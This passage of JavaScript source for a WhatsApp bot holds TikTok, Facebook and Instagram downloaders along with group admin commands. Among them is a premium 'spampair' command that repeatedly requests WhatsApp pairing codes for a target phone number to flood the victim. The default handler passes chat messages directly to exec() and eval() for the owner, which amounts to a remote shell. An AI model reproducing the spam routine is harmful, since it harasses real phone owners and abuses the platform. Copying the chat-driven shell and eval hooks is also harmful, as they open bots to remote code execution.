                    id: `${prefix}gettt wm ${videoUrl}`
                },
                {
                    title: "Video No WM (Document)",
                    description: "Send as .mp4 file (no watermark)",
                    id: `${prefix}gettt nowm_doc ${videoUrl}`
                },
                {
                    title: "Video WM (Document)",
                    description: "Send as .mp4 file (with watermark)",
                    id: `${prefix}gettt wm_doc ${videoUrl}`
                },
                {
                    title: "Audio Only",
                    description: "Extract original sound / music",
                    id: `${prefix}gettt audio ${videoUrl}`
                }
            ];

            let sections = [{
                title: "Download Options",
                highlight_label: "TikTok • @Simple Wa - Bot",
                rows: rows
            }];

            const buttonMessage = {
                text: menuText,
                footer: footer,
                headerType: 1,
                viewOnce: true,
                buttons: [{
                    buttonId: "action",
                    buttonText: { displayText: "Select Format ♻️" },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "TikTok Download Options",
                            sections: sections
                        })
                    }
                }]
            };

            return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });

        } catch (err) {
            console.error(err);
            return Dxz.sendMessage(m.chat, {
                text: "❌ Failed to fetch TikTok video.\nMaybe private / region locked / API issue."
            }, { quoted: m });
        }
    }

    // ──── 2. Search case ────
    else {
        try {
            const searchUrl = `https://www.movanest.xyz/v2/tiktoksearch?query=${encodeURIComponent(input)}`;
            const res = await fetch(searchUrl);
            const json = await res.json();

            if (!json?.status || !json?.results?.length) {
                return Dxz.sendMessage(m.chat, { text: `No results found for "${input}"` }, { quoted: m });
            }

            const videos = json.results.slice(0, 10); // top 10

            let textResult = `*TikTok Search Results for "${input}"*\n> *Found ${json.count || videos.length} videos*\n\n`;

            let rows = [];

            videos.forEach((vid, i) => {
                const title = (vid.title || "Untitled").substring(0, 60) + (vid.title.length > 60 ? "..." : "");
                const views = vid.play_count ? `👀 ${vid.play_count.toLocaleString()}` : "";
                const likes = vid.digg_count ? `❤️ ${vid.digg_count.toLocaleString()}` : "";

                textResult += `\`${i+1}\`. ${title}\n   ${views} • ${likes}\n   By @${vid.author?.unique_id || "user"}\n\n`;

                rows.push({
                    title: `${i+1}. ${title.substring(0, 45)}${title.length > 45 ? "..." : ""}`,
                    description: `${vid.region || "?"} • ${views || ""}`,
                    id: `${prefix}gettt nowm https://www.tiktok.com/@${vid.author?.unique_id || "user"}/video/${vid.video_id}`
                });
            });

            textResult += `\n> *Use buttons to download (no watermark by default)*`;

            let sections = [{
                title: `Top Results (${videos.length})`,
                highlight_label: "TikTok Search • @Simple Wa - Bot",
                rows: rows
            }];

            const buttonMsg = {
                text: textResult,
                footer: footer,
                headerType: 1,
                viewOnce: true,
                buttons: [{
                    buttonId: "action",
                    buttonText: { displayText: "Download Video ﹒ᗢ﹒" },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "Choose Video to Download",
                            sections: sections
                        })
                    }
                }]
            };

            await Dxz.sendMessage(m.chat, buttonMsg, { quoted: m });
            await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (err) {
            console.error("tiktok search error:", err);
            return Dxz.sendMessage(m.chat, {
                text: "😣 Error while searching TikTok videos."
            }, { quoted: m });
        }
    }
}
break;

case 'gettt': {
    await Dxz.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

    const args = text.trim().split(/ +/);
    if (args.length < 2) {
        return Dxz.sendMessage(m.chat, {
            text: `Usage: ${prefix}gettt [nowm | wm | nowm_doc | wm_doc | audio] <tiktok url>`
        }, { quoted: m });
    }

    const type = args[0].toLowerCase();
    const url = args[1];

    if (!url.includes('tiktok')) {
        return Dxz.sendMessage(m.chat, { text: "❌ Provide a valid TikTok URL" }, { quoted: m });
    }

    try {
        const apiUrl = `https://www.movanest.xyz/v2/tiktok?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !json?.results) {
            throw new Error("API did not return valid data");
        }

        const data = json.results;
        const title = (data.title || "TikTok Video").replace(/[^a-zA-Z0-9]/g, '_');
        const thumb = data.cover || data.origin_cover;

        let sendMedia;

        switch (type) {
            case 'nowm':
                sendMedia = {
                    video: { url: data.no_watermark },
                    mimetype: 'video/mp4',
                    fileName: `${title}_no_wm.mp4`,
                    caption: `🎬 *${data.title}*\n> No Watermark • @Simple Wa - Bot`,
                    contextInfo: {
                        externalAdReply: {
                            title: data.title,
                            body: "No Watermark Download",
                            thumbnailUrl: thumb,
                            sourceUrl: url,
                            mediaType: 2
                        }
                    }
                };
                break;

            case 'wm':
                sendMedia = {
                    video: { url: data.watermark },
                    mimetype: 'video/mp4',
                    fileName: `${title}_wm.mp4`,
                    caption: `🎬 *${data.title}*\n> With Watermark • @Simple Wa - Bot`
                };
                break;

            case 'nowm_doc':
            case 'wm_doc':
                const videoUrl = type === 'nowm_doc' ? data.no_watermark : data.watermark;
                const suffix = type === 'nowm_doc' ? '_no_wm' : '_wm';
                sendMedia = {
                    document: { url: videoUrl },
                    mimetype: 'video/mp4',
                    fileName: `${title}${suffix}.mp4`,
                    caption: `📹 *${data.title}*\n${type.includes('nowm') ? 'No Watermark' : 'With Watermark'}\n> Downloaded via @Simple Wa - Bot`
                };
                break;

            case 'audio':
                sendMedia = {
                    audio: { url: data.music },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}_audio.mp3`,
                    contextInfo: {
                        externalAdReply: {
                            title: data.title || "TikTok Sound",
                            body: "Audio Extracted • @Simple Wa - Bot",
                            thumbnailUrl: thumb,
                            sourceUrl: url,
                            mediaType: 2
                        }
                    }
                };
                break;

            default:
                return Dxz.sendMessage(m.chat, { text: "❌ Invalid type! Use: nowm | wm | nowm_doc | wm_doc | audio" }, { quoted: m });
        }

        await Dxz.sendMessage(m.chat, sendMedia, { quoted: m });
        await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("gettt error:", err.message);
        await Dxz.sendMessage(m.chat, {
            text: "😣 Couldn't download from TikTok… try another video?"
        }, { quoted: m });
    }
}
break;

case 'fb':
case 'facebook':
case 'fbvid':
case 'fbvideo': {
    await Dxz.sendMessage(m.chat, { react: { text: '📹', key: m.key } });

    if (!text) {
        return Dxz.sendMessage(m.chat, {
            text: `✘ Please provide a Facebook video link!\nExample: ${prefix}fb https://www.facebook.com/...`
        }, { quoted: m });
    }

    const url = text.trim();

    // Basic validation - very rough check
    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
        return Dxz.sendMessage(m.chat, {
            text: "❌ Please send a valid Facebook video link (contains facebook.com or fb.watch)"
        }, { quoted: m });
    }

    // Optional: you can add a quick title fetch if you want (using another API or skip)
    let videoTitle = "Facebook Video";
    let thumbnail = "https://d1xsi6mgo67kia.cloudfront.net/uploads/2024/01/Facebook-Checklist.png"; // fallback

    // Prepare nice menu like song command
    let menuText = `*Facebook Video Downloader 📹*\n\n` +
                   `\`URL\`: ${url}\n\n` +
                   `_*Choose quality & type ↓*_`;

    let rows = [
        {
            title: "HD Video (Play in WhatsApp)",
            description: "Best quality - plays inline",
            id: `${prefix}getfb hd audio ${url}`
        },
        {
            title: "HD Video (Document)",
            description: "High quality - downloadable file",
            id: `${prefix}getfb hd document ${url}`
        },
        {
            title: "SD Video (Play in WhatsApp)",
            description: "Normal quality - smaller size",
            id: `${prefix}getfb sd audio ${url}`
        },
        {
            title: "SD Video (Document)",
            description: "Normal quality - downloadable",
            id: `${prefix}getfb sd document ${url}`
        },
    ];

    let sections = [
        {
            title: "Download Options",
            highlight_label: "Facebook • @Simple Wa - Bot",
            rows: rows,
        },
    ];

    const buttonMessage = {
        text: menuText,
        footer: footer,
        headerType: 1,
        viewOnce: true,
        buttons: [
            {
                buttonId: "action",
                buttonText: { displayText: "Select Quality & Type ﹒ᗢ﹒" },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Choose Format ♪",
                        sections: sections
                    })
                }
            }
        ]
    };

    return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

// ──────────────── Helper command to download & send ────────────────
case 'getfb': {
    await Dxz.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

    const args = text.trim().split(/ +/);
    if (args.length < 3) {
        return Dxz.sendMessage(m.chat, {
            text: `Usage: ${prefix}getfb [hd|sd] [audio|document] <facebook url>`
        }, { quoted: m });
    }

    const quality = args[0].toLowerCase();
    const sendType = args[1].toLowerCase();
    const url = args[2];

    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
        return Dxz.sendMessage(m.chat, { text: "❌ Invalid Facebook URL" }, { quoted: m });
    }

    if (!['hd', 'sd'].includes(quality)) {
        return Dxz.sendMessage(m.chat, { text: "❌ Quality must be `hd` or `sd`" }, { quoted: m });
    }

    if (!['audio', 'document'].includes(sendType)) {
        return Dxz.sendMessage(m.chat, { text: "❌ Type must be `audio` or `document`" }, { quoted: m });
    }

    try {
        const apiUrl = `https://www.movanest.xyz/v2/fbdown?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !json?.results?.length) {
            throw new Error("No download links found from API");
        }

        const result = json.results[0]; // take first result (usually the main video)

        let dlUrl = null;
        let filenameSuffix = "";

        if (quality === 'hd') {
            dlUrl = result.hdQualityLink;
            filenameSuffix = "_HD";
        } else {
            dlUrl = result.normalQualityLink;
            filenameSuffix = "_SD";
        }

        if (!dlUrl) {
            throw new Error(`No ${quality.toUpperCase()} link available`);
        }

        const title = result.title && result.title !== "No video title" 
            ? result.title 
            : "Facebook Video";

        const thumb = result.thumbnail || "https://d1xsi6mgo67kia.cloudfront.net/uploads/2024/01/Facebook-Checklist.png";
        const filename = `${title.replace(/[^a-zA-Z0-9]/g, '_')}${filenameSuffix}.mp4`;

        if (sendType === 'audio') {
            // Send as playable video (WhatsApp inline player)
            await Dxz.sendMessage(m.chat, {
                video: { url: dlUrl },
                mimetype: 'video/mp4',
                fileName: filename,
                caption: `🎥 *${title}* (${quality.toUpperCase()})`,
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: `Downloaded via @Simple Wa - Bot • ${quality.toUpperCase()}`,
                        mediaType: 2,
                        thumbnailUrl: thumb,
                        sourceUrl: url
                    }
                }
            }, { quoted: m });
        }
        else if (sendType === 'document') {
            // Send as downloadable document
            await Dxz.sendMessage(m.chat, {
                document: { url: dlUrl },
                mimetype: 'video/mp4',
                fileName: filename,
                caption: `🎥 *${title}* (${quality.toUpperCase()})\n\n> Downloaded via @Simple Wa - Bot`
            }, { quoted: m });
        }

        await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("getfb error:", err.message);
        await Dxz.sendMessage(m.chat, {
            text: "😣 Couldn't download the Facebook video… maybe private / restricted?\n" + 
                  (err.message.includes("API") ? "(API issue)" : "")
        }, { quoted: m });
    }
}
break;

case 'ig':
case 'insta':
case 'instagram':
case 'reel':
case 'igdl': {
    await Dxz.sendMessage(m.chat, { react: { text: '📸', key: m.key } });

    if (!text) {
        return Dxz.sendMessage(m.chat, {
            text: `✘ Please provide an Instagram link!\nExample: ${prefix}ig https://www.instagram.com/reel/ABC123xyz/`
        }, { quoted: m });
    }

    const url = text.trim();
    if (!url.includes('instagram.com')) {
        return Dxz.sendMessage(m.chat, {
            text: `❌ Please send a valid Instagram URL (post/reel/story)`
        }, { quoted: m });
    }

    // Prepare menu
    let menuText = `*Instagram Downloader 📱*\n\n` +
                   `\`URL\`: ${url}\n\n` +
                   `_*Choose download type ↓*_`;

    let rows = [
        {
            title: "Video (Play in WhatsApp)",
            description: "Send as playable video",
            id: `${prefix}getig video ${url}`
        },
        {
            title: "Document (.mp4 file)",
            description: "Send as downloadable file",
            id: `${prefix}getig document ${url}`
        },
        {
            title: "Audio (.mp3)",
            description: "Extract audio from video",
            id: `${prefix}getig audio ${url}`
        },
    ];

    let sections = [
        {
            title: "Download Options",
            highlight_label: "Instagram • @Simple Wa - Bot",
            rows: rows,
        },
    ];

    const buttonMessage = {
        text: menuText,
        footer: footer,
        headerType: 1,
        viewOnce: true,
        buttons: [
            {
                buttonId: "action",
                buttonText: { displayText: "Select Format ♪﹒ᗢ﹒" },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Choose Download Type",
                        sections: sections
                    })
                }
            }
        ]
    };

    return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

// ──────────────── Helper command to download & send Instagram content ────────────────
case 'getig': {
    await Dxz.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

    const args = text.trim().split(/ +/);
    if (args.length < 2) {
        return Dxz.sendMessage(m.chat, {
            text: `Usage: ${prefix}getig [video|document|audio] <instagram url>`
        }, { quoted: m });
    }

    const type = args[0].toLowerCase();
    const url = args[1];

    if (!url.includes('instagram.com')) {
        return Dxz.sendMessage(m.chat, { text: "❌ Invalid Instagram URL" }, { quoted: m });
    }

    try {
        const apiUrl = `https://www.movanest.xyz/v2/instagram?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !json?.results?.videoUrl) {
            throw new Error("API did not return a valid download link");
        }

        const videoUrl = json.results.videoUrl;
        const posterUrl = json.results.posterUrl || "https://i.imgur.com/InstagramDefault.jpg";
        const captionTitle = json.results.caption || "Instagram Media";
        // Using short safe filename
        const safeTitle = (captionTitle || "instagram_media").replace(/[^a-zA-Z0-9]/g, '_').slice(0, 60);
        const filenameVideo = `${safeTitle}.mp4`;
        const filenameAudio = `${safeTitle}.mp3`;

        if (type === 'video') {
            // Send as playable video in WhatsApp
            await Dxz.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                fileName: filenameVideo,
                caption: `🎬 *Instagram Video*\n\n> Downloaded via @Simple Wa - Bot`,
                contextInfo: {
                    externalAdReply: {
                        title: "Instagram Downloader",
                        body: captionTitle.slice(0, 80) + (captionTitle.length > 80 ? '...' : ''),
                        thumbnailUrl: posterUrl,
                        mediaType: 2,
                        sourceUrl: url
                    }
                }
            }, { quoted: m });
        }
        else if (type === 'document') {
            // Send as downloadable .mp4 document
            await Dxz.sendMessage(m.chat, {
                document: { url: videoUrl },
                mimetype: 'video/mp4',
                fileName: filenameVideo,
                caption: `📹 *${filenameVideo}*\n\n> Downloaded via @Simple Wa - Bot`
            }, { quoted: m });
        }
        else if (type === 'audio') {
            // For audio → we send the same video URL but tell WhatsApp it's audio
            // Many WhatsApp bots do this trick — WhatsApp will try to play it as audio if mimetype is set correctly
            // (the API already gives mp4, but we force audio context)
            await Dxz.sendMessage(m.chat, {
                audio: { url: videoUrl },
                mimetype: 'audio/mpeg',          // ← important trick
                fileName: filenameAudio,
                contextInfo: {
                    externalAdReply: {
                        title: "Instagram Audio Extract",
                        body: "Converted from reel/post",
                        mediaType: 2,
                        thumbnailUrl: posterUrl,
                        sourceUrl: url
                    }
                }
            }, { quoted: m });
        }
        else {
            return Dxz.sendMessage(m.chat, {
                text: "❌ Invalid type! Use `video`, `document` or `audio`"
            }, { quoted: m });
        }

        await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error("getig error:", err.message);
        await Dxz.sendMessage(m.chat, {
            text: "😣 Couldn't download from Instagram…\nMaybe private account or API issue?\n" + 
                  (err.message.includes("API") ? "(API response invalid)" : "")
        }, { quoted: m });
    }
}
break;

case 'spampair': {
if (!isDanupa) return m.reply(`*Hey ${pushname}! 💖 Unlock exclusive features with a premium subscription. If you want to unlock Premium Commands Contact \`Danuzz\` using this number \`+94766911711\`*! ✨`)
await Dxz.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
if (!text) return m.reply(`*Example:* ${prefix + command} +947xxxxxx|150`)
m.reply('*Wait Cutie!!*')
let [peenis, pepekk = "200"] = text.split("|")
let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('bail')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })
for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
}
await m.reply(`_*Succes Spam Pairing Code --Fucker ${pepekk}!!*_`)
await sleep(15000)
}
break;

case "hidetag": case "z": case "h": {
Dxz.sendMessage(m.chat, { react: { text: '🔊', key: m.key } })
if (!isGroup) return reply("*Only Can Use In Group!*")
if (!isAdmin && !isOwner) return reply("*Your Not Admin Or Owner!*")
if (!m.quoted && !text) return reply(example("*Send the text or reply to a message containing the text.*"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
Dxz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break;

case "tagall": case "tag": {
Dxz.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
if (!isGroup) return reply("*Only Can Use In Group!*")
if (!isAdmin && !isOwner) return reply("*Your Not Admin Or Owner!*")
if (!text) return reply(example("*Please provide the message.*"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
Dxz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break;

case 'ctag': 
case 'customtag': {
Dxz.sendMessage(m.chat, { react: { text: '🔊', key: m.key } })
  try {
    if (!text.includes('|')) return reply('Example: .ctag 94xxxxxx|cukiiiiiiiiiiiii')

    let [nomor, isiTag] = text.split('|')
    nomor = nomor.replace(/\D/g, '')
    if (!nomor) return reply('Invalid number!')
    if (!isiTag) return reply('Tag text cannot be empty!')

    let jid = [`${nomor}@s.whatsapp.net`]

    await Dxz.sendMessage(m.chat, {
      text: `@${m.chat}`,
      contextInfo: {
        mentionedJid: jid,
        groupMentions: [
          {
            groupSubject: isiTag,
            groupJid: m.chat,
          },
        ],
      },
    })
  } catch (e) {
    reply(`❌ Error\nError logs: ${e.message || e}`)
  }
}
break;

case "setdesgc": case "setdesk": {
Dxz.sendMessage(m.chat, { react: { text: '🦧', key: m.key } })
if (!isGroup) return reply("This command can only be used in a group.")
if (!isBotAdmin) return reply("I need to be an admin to perform this action.")
if (!isAdmin && !isOwner) return reply("Only group admins or the owner can use this command.")
if (!text) return reply(example('the text'))
await Dxz.groupUpdateDescription(m.chat, text)
reply(`*Successfully Changed Group Description ✅*`)
}
break;

case "open": case "unmute": {
Dxz.sendMessage(m.chat, { react: { text: '🔔', key: m.key } })
if (!isGroup) return reply("This command can only be used in a group!")
if (!isBotAdmin) return reply("*Your Not Bot Admin!*")
if (!isOwner && !isAdmin) return reply("This command can only be used by group admins!")
await Dxz.groupSettingUpdate(m.chat, 'not_announcement')
reply("*Successfully Changed Group Settings 🪻*\nNow *Members* can send messages.")
}
break;

case "close": case "mute": {
Dxz.sendMessage(m.chat, { react: { text: '🔕', key: m.key } })
if (!isGroup) return reply("This command can only be used in a group!")
if (!isBotAdmin) return reply("*Your Not Bot Admin!*")
if (!isOwner && !isAdmin) return reply("This command can only be used by group admins!")
await Dxz.groupSettingUpdate(m.chat, 'announcement')
reply("*Successfully Changed Group Settings 🪻*\nNow *Members* can' t send messages.")
}
break;

case "add": case "addmember": {
Dxz.sendMessage(m.chat, { react: { text: '👤', key: m.key } })
  if (!isGroup) return reply("This command can only be used in a group")
  if (!args[0]) return reply("Example: 9474838XXX")
  var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  var cek = await Dxz.onWhatsApp(`${teks.split("@")[0]}`)
  if (cek.length < 1) return reply("That number is not registered on WhatsApp")
  if (!isBotAdmin || !groupMetadata.memberAddMode) return reply("Failed to add member because admins do not allow participants to add members")
  var a = await Dxz.groupParticipantsUpdate(m.chat, [teks], 'add')
  if (a[0].status == 200) return reply(`Successfully added ${teks.split("@")[0]} to this group`)
  if (a[0].status == 408) return reply(`Failed to add ${teks.split("@")[0]} to this group because the target does not allow others to add them to groups`)
  if (a[0].status == 409) return reply("They are already in this group!")
  if (a[0].status == 403) return reply(`Failed to add ${teks.split("@")[0]} to this group because the target does not allow others to add them to groups`)
}
break;

case "kik": case "kick": {
Dxz.sendMessage(m.chat, { react: { text: '🕯️', key: m.key } })
  if (!isGroup) return reply("This command can only be used in a group")
  if (!isBotAdmin) return reply("The bot must be an admin to use this command")
  if (!isAdmin && !isOwner) return reply("You must be an admin to use this command")
  if (text || m.quoted) {
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    await Dxz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Dxz.sendMessage(m.chat, {text: `Successfully removed @${users.split("@")[0]} from this group`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
  } else return reply("Example: number/@tag")
}
break;
        
case 'ping':
        
        function runtime(seconds) {
        seconds = Number(seconds);
        const d = Math.floor(seconds / (3600 * 24));
        const h = Math.floor((seconds % (3600 * 24)) / 3600);
        const m = Math.floor((seconds % 3600) / 60);
        const s = Math.floor(seconds % 60);
        const dDisplay = d > 0 ? d + (d === 1 ? " day, " : " days, ") : "";
        const hDisplay = h > 0 ? h + (h === 1 ? " hour, " : " hours, ") : "";
        const mDisplay = m > 0 ? m + (m === 1 ? " minute, " : " minutes, ") : "";
        const sDisplay = s > 0 ? s + (s === 1 ? " second" : " seconds") : "";
        return (dDisplay + hDisplay + mDisplay + sDisplay) || "0 seconds";
    }
        
                const start = Date.now();
                await Dxz.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
                const end = Date.now();
                await reply(`Pong! ⚡\nSpeed: ${end - start}ms\nRuntime: ${runtime(process.uptime())}`);
                break;

default:
        
if (budy.startsWith('$')) {
if (!isDanupa) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Dxz.sendMessage(m.chat, {text: err.toString()}, {quoted: m })
if (stdout) return Dxz.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m })
})}

if (budy.startsWith(">")) {
if (!isDanupa) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Dxz.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m })
} catch (e) {
Dxz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m })
}}

if (budy.startsWith("=>")) {
if (!isDanupa) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Dxz.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m })
} catch (e) {
return Dxz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m })
}}
}
} catch (err) {
console.log(util.format(err))
}
}

//~~~~~Status Updated~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
